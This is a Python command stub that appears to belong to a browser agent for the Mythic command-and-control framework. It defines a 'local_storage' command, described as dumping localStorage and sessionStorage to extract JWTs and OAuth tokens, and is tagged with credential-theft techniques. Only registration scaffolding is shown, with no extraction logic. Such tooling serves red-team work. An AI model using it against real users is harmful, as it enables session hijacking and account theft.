from mythic_container.MythicCommandBase import (
    CommandBase, TaskArguments, CommandParameter, ParameterType,
    MythicTask, PTTaskMessageAllData, PTTaskProcessResponseMessageResponse,
    CommandAttributes,
)


class LocalStorageArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = []

    async def parse_arguments(self):
        pass


class LocalStorageCommand(CommandBase):
    cmd            = "local_storage"
    needs_admin    = False
    help_cmd       = "local_storage"
    description    = (
        "Dump localStorage and sessionStorage from the active tab. "
        "Useful for extracting JWTs, OAuth tokens, and application state."
    )
    version        = 1
    author         = "@asaurusrex"
    argument_class = LocalStorageArguments
    parameters     = []
    attackmapping  = ["T1539", "T1552"]
    attributes     = CommandAttributes(filter_by_build_parameter={}, supported_os=[])

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        task.display_params = ""
        return task

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
